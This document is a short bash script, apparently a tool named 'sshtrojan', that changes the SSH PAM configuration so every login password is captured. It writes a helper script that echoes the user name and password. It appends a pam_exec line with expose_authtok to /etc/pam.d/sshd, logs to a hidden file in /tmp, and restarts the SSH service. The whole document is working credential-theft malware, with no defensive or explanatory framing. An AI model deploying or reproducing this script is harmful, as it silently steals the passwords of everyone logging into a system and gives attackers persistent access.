#!/bin/bash

file_log="/tmp/.log_sshtrojan1.txt"

if ! [[ -f $file_log ]]; 
then
    touch $file_log
fi

file_script="/script.sh"
touch $file_script
echo "#!/bin/bash" > $file_script
echo "read password" >> $file_script
echo 'echo "User: $PAM_USER"' >> $file_script
echo 'echo "Password : $password"' >> $file_script

chmod +x $file_script

file_sshd="/etc/pam.d/sshd"
echo "@include common-auth" >> $file_sshd
echo "auth       required   pam_exec.so   expose_authtok   seteuid   log=$file_log   $file_script" >> $file_sshd


# restart ssh
/etc/init.d/ssh restart
